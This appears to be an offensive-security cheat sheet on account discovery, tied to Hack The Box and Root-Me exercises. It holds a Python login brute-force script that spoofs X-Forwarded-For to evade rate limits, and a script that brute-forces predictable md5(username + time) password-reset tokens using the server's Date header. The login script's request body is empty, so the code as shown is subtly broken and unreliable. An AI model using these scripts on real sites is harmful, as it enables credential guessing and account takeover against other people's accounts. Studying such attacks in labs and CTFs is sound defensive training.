# Account discovery

<hr class="sep-both">

## Log In Page

<div class="row row-cols-lg-2"><div>

#### Log In Page — Rate Limit

[![broken_authentication](../../../../_badges/htb/broken_authentication.svg)](https://academy.hackthebox.com/course/preview/broken-authentication)

Some websites are implementing a rate timer often using a super increasing wait time. If they are checking the `X-Forwarded-For` to avoid blocking proxies, it means we can arbitrary pick an IP to "ban".

```py
import argparse
import time
import requests

parser = argparse.ArgumentParser(description='Login Brute Force Script')
parser.add_argument('-u', '--userlist', dest='users', required=True, help='Path to the wordlist of usernames')
parser.add_argument('-p', '--passlist', dest='passwords', required=True, help='Path to the wordlist of passwords')
args = parser.parse_args()

with open(args.users, 'r') as f:
    users = [line.strip() for line in f.readlines()]

with open(args.passwords, 'r') as f:
    passwords = [line.strip() for line in f.readlines()]
```
</div><div>

```py
s = requests.Session()
ip_offset = 1
base_ip = '0.0.0.'
for user in users:
    for password in passwords:
        while True:
            response = s.post(
                url='URL/login.php',
                data={
                },
                headers={
                    'X-Forwarded-For': base_ip + str(ip_offset)
                }
            )
            if 'Invalid credentials' in response.text:
                print(f"[-] Failed with {user}:{password}")
                break
            elif 'Too many login failures' in response.text:
                time.sleep(30)
            elif 'Welcome back' in response.text:
                print(f"[+] Found credentials {user}:{password}")
                break
            else:
                print(f"[!] Unexpected reply for {user}:{password}")
                print(response.text)
                break

            ip_offset += 1
```

</div></div>

<hr class="sep-both">

## Password Reset

<div class="row row-cols-lg-2"><div>

#### Password Reset — Predictable Token

[![broken_authentication](../../../../_badges/htb/broken_authentication.svg)](https://academy.hackthebox.com/course/preview/broken-authentication)
[![marabout](../../../../_badges/rootme/realist/marabout.svg)](https://www.root-me.org/en/Challenges/Realist/Marabout)

Reset tokens associated with a request to reset a user account should be randomly generated. Some are using predictable values:

* 🪓 Some hashing function: `md5(username)`
* 🗺️ Some short number: `12345`
* 🪦 Some temporary password based on known data
* 🚧 Some known values to the user, such as with [CVE-2016-0783](https://nvd.nist.gov/vuln/detail/CVE-2016-0783)

```php!
$time = intval(microtime(true) * 1000);
$token = md5($username . $time);
```

Most servers are returning a Date Header with the date of the server. We only need to brute force the microsecond.

```py
time_string = "Sat, 04 May 2024 09:35:52 GMT"
format_string = "%a, %d %b %Y %H:%M:%S %Z"
dt_object = datetime.datetime.strptime(time_string, format_string)
dt_object = pytz.timezone('GMT').localize(dt_object)
base_epoch_ms = int(dt_object.timestamp() * 1000)
for epoch_ms in range(base_epoch_ms - 1000, base_epoch_ms + 1000 + 1):
    token = hashlib.md5(('username' + str(epoch_ms)).encode()).hexdigest()
    # test the token
```
</div><div>
</div></div>